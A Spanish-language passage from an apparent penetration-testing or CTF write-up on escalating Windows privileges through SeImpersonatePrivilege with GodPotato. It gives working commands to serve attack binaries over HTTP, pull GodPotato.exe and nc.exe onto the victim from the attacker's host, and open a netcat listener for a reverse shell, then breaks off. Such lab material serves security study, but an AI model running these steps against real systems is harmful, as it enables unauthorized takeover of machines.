## Explotación

Con `SeImpersonatePrivilege` identificado y habilitado, podemos pasar a la fase de explotación.

Para este escenario utilizaremos:

- `GodPotato.exe` explotación de `SeImpersonatePrivilege`.
- `nc.exe` recepción de una conexión `reverse shell`.

Ambos binarios deben estar disponibles en la máquina atacante y posteriormente ser transferidos al sistema víctima.

En la máquina atacante levantamos un servidor HTTP desde el directorio donde se encuentran los binarios:

```bash
python3 -m http.server 8000
```
Ahora, desde la máquina víctima descargamos las herramientas:
```
Invoke-WebRequest -Uri "http://myipaddress:8000/GodPotato.exe" -OutFile "GodPotato.exe"
Invoke-WebRequest -Uri "http://myipaddress:8000/nc.exe" -OutFile "nc.exe"
```

Con `GodPotato.exe` y `nc.exe` ya transferidos a la máquina víctima, procedemos a explotar `SeImpersonatePrivilege`.

Primero configuramos `netcat` en la máquina atacante para recibir la conexión:

```bash
nc -lvnp 4444
